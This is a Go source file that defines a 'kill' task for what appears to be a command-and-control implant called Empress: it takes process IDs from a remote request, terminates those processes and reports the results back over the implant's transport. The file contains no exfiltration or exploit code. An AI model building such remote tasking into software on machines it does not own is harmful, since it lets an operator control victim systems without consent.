package proc

import (
	"errors"
	"fmt"
	"github.com/pygrum/Empress/tasks/core/proc/ps"
	"github.com/pygrum/Empress/transport"
	"os"
	"strconv"
)

func CmdKill(req *transport.Request, response *transport.Response) {
	for _, arg := range req.Args {
		pid, err := strconv.Atoi(string(arg))
		if err != nil {
			transport.ResponseWithError(response, errors.New("invalid process id"))
			continue
		}
		if p, err := ps.FindProcess(pid); err == nil && p == nil {
			transport.ResponseWithError(response, errors.New("process not found"))
			continue
		}
		// get core to kill
		p, err := os.FindProcess(pid)
		if p == nil {
			// just in case p is nil, so we can avoid a panic
			transport.ResponseWithError(response, fmt.Errorf("couldn't find pid %d: %v", pid, err))
			continue
		}
		if err = p.Kill(); err != nil {
			transport.ResponseWithError(response, errors.New(err.Error()))
			continue
		}
		transport.AddResponse(response, transport.ResponseDetail{
			Status: transport.StatusSuccess,
			Dest:   transport.DestNone,
		})
	}
}
